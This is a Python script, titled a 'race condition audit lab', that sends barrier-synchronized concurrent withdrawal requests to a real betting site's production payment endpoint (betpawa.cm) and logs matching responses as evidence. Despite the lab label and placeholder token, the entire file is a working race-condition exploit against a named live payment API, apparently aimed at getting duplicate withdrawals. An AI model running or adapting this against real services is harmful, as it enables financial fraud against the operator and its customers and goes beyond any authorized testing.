import requests
import time
import threading
import concurrent.futures
import json
import csv
import hashlib
import uuid
import statistics

from collections import Counter, defaultdict
from datetime import datetime, timezone

session = requests.Session()

url = "http://www.betpawa.cm/api/payment/v2/withdrawal/request/process"

AUTH_TOKEN = "YOUR_LOCAL_TEST_TOKEN"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Authorization": f"Bearer {AUTH_TOKEN}",
    "X-Pawa-Brand": "betpawa-cameroon",
    "X-Pawa-Language": "en"
}

payload = {
    "amount": 100,
    "BankAccountNumber": "",
    "BankId": "",
    "channel": "",
    "payoutType": "CAMEROON_MTN_PAWAPAY",
    "payoutTypeName": "MTN",
    "isNameSet": True
}

WORKERS = 5
ROUNDS = 3
TIMEOUT = 10

results = []


# ==================================
# RESPONSE FINGERPRINT
# ==================================

def fingerprint(body):

    encoded = json.dumps(
        body,
        sort_keys=True,
        default=str
    ).encode()

    return hashlib.sha256(encoded).hexdigest()


# ==================================
# SEND REQUEST
# ==================================

def send_request(index, barrier, round_number):

    worker_session = requests.Session()

    request_id = str(uuid.uuid4())

    try:

        barrier.wait(timeout=15)

        start = time.perf_counter()

        response = worker_session.post(
            url,
            headers={
                **headers,
                "X-Test-Request-ID": request_id
            },
            json=payload,
            timeout=TIMEOUT
        )

        duration = time.perf_counter() - start

        try:
            body = response.json()
        except ValueError:
            body = response.text[:1000]

        result = {
            "round": round_number,
            "worker": index,
            "request_id": request_id,
            "status": response.status_code,
            "duration": round(duration, 6),
            "fingerprint": fingerprint(body),
            "response": json.dumps(body, default=str),
            "response_headers": json.dumps(
                dict(response.headers)
            ),
            "timestamp": datetime.now(
                timezone.utc
            ).isoformat()
        }

        print(f"\nRound {round_number} | Worker {index}")
        print("Request ID:", request_id)
        print("Status:", response.status_code)
        print("Duration:", result["duration"])
        print("Response:", str(body)[:150])

        return result

    except requests.RequestException as error:

        return {
            "round": round_number,
            "worker": index,
            "request_id": request_id,
            "status": "ERROR",
            "duration": None,
            "fingerprint": None,
            "response": str(error),
            "response_headers": None,
            "timestamp": datetime.now(
                timezone.utc
            ).isoformat()
        }

    finally:

        worker_session.close()


# ==================================
# RUN CONCURRENT ROUND
# ==================================

def run_round(round_number):

    print(f"\n========== ROUND {round_number} ==========")

    barrier = threading.Barrier(WORKERS)

    with concurrent.futures.ThreadPoolExecutor(
        max_workers=WORKERS
    ) as executor:

        futures = [
            executor.submit(
                send_request,
                index,
                barrier,
                round_number
            )
            for index in range(1, WORKERS + 1)
        ]

        return [
            future.result()
            for future in futures
        ]


# ==================================
# ANALYSIS
# ==================================

def analyze(data):

    print("\n========== ANALYSIS ==========")

    if not data:
        print("No results available.")
        return

    statuses = Counter(
        str(item["status"])
        for item in data
    )

    fingerprints = defaultdict(list)

    for item in data:

        if item["fingerprint"]:
            fingerprints[
                item["fingerprint"]
            ].append(item["request_id"])

    timings = [
        item["duration"]
        for item in data
        if item["duration"] is not None
    ]

    print("Total responses:", len(data))
    print("Status distribution:", dict(statuses))

    print(
        "Identical response groups:",
        [
            len(group)
            for group in fingerprints.values()
            if len(group) > 1
        ]
    )

    if timings:

        print("Fastest:", min(timings))
        print("Slowest:", max(timings))
        print("Average:", statistics.mean(timings))
        print("Median:", statistics.median(timings))


# ==================================
# SAVE CSV EVIDENCE
# ==================================

def save_evidence(data):

    if not data:
        print("No evidence available.")
        return

    filename = "race_evidence.csv"

    with open(
        filename,
        "w",
        newline="",
        encoding="utf-8"
    ) as file:

        writer = csv.DictWriter(
            file,
            fieldnames=list(data[0].keys())
        )

        writer.writeheader()
        writer.writerows(data)

    print("\nEvidence saved:", filename)


# ==================================
# MAIN
# ==================================

def main():

    print("RACE CONDITION AUDIT LAB")
    print("Target:", url)
    print("Workers:", WORKERS)
    print("Rounds:", ROUNDS)

    all_results = []

    for round_number in range(1, ROUNDS + 1):

        round_results = run_round(round_number)

        all_results.extend(
            item for item in round_results
            if item is not None
        )

        analyze(round_results)

        time.sleep(2)

    print("\n========== FINAL ANALYSIS ==========")

    analyze(all_results)

    save_evidence(all_results)

    session.close()

    print("\nAudit completed.")


if __name__ == "__main__":
    main()
